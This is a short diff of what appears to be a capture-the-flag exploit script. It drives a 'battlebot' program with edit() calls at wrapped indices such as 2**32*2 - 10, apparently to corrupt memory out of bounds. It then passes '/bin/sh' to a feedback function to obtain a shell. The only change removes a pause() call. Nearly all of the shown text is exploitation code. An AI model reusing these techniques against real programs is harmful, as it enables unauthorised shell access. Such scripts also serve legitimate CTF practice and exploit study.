@@ -59,8 +59,6 @@ edit(2**32 * 2 - 9, hp9, shd9, atk9)
 print(f'[*] editing battlebot -10 to {hp10} {shd10} {atk10}')
 edit(2**32 * 2 - 10, hp10, shd10, atk10)
 
-pause()
-
 print(f'[*] legalize nuclear bombs')
 leave_feedback('/bin/sh')
 
